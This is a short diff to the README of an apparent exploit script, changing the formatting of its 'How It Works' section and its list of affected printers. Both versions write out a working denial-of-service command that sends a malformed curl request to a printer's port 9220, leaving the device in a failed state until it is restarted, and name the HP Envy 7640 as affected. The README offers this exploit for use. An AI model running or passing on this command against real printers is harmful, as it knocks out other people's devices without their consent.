@@ -32,11 +32,13 @@ This script is fully compatible with `Termux` for Android.
 ## How It Works
 
 While the inner workings are more complicated, the exploit in its purest form is as follows:<br>
-```curl [IP]:9220 -X 'open 99999999'```<br>
+`curl [IP]:9220 -X 'open 99999999'`<br>
 As mentioned above, the printer will go into a failed state and remain in said state until restarted.
 
 ## Known Affected Models
-HP Envy 7640
+| Model | DoS | Mass Print |
+| :---  | :---: |     ---: |
+|  HP Envy 7640  |  TRUE  |  False  |
 
 ## CLI Options
 
